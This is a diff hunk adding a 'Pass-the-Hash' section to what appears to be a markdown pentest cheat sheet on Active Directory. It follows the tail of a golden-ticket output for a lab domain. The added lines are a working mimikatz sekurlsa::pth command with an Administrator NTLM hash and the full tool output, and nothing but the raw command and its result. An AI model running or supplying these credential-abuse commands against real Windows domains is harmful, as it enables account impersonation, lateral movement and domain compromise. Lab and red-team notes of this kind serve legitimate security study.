@@ -34,3 +34,31 @@ Lifetime  : 22/03/2018 15:36:25 ; 19/03/2028 15:36:25 ; 19/03/2028 15:36:25
 Golden ticket for 'Administrator @ testlab.local' successfully submitted for current session    
     
 ```
+
+ ## Pass-the-Hash 
+ 
+ ```
+ mimikatz # sekurlsa::pth /user:Administrator /domain:FS01 /rc4:fc525c9683e8fe067095ba2ddc971889 /ptt
+user    : Administrator
+domain  : FS01
+program : cmd.exe
+impers. : no
+NTLM    : fc525c9683e8fe067095ba2ddc971889
+  |  PID  3876
+  |  TID  2952
+  |  LSA Process is now R/W
+  |  LUID 0 ; 691999 (00000000:000a8f1f)
+  \_ msv1_0   - data copy @ 00000214BC31C610 : OK !
+  \_ kerberos - data copy @ 00000214BC5529B8
+   \_ aes256_hmac       -> null
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace -> null
+   
+ ```
+ 
+
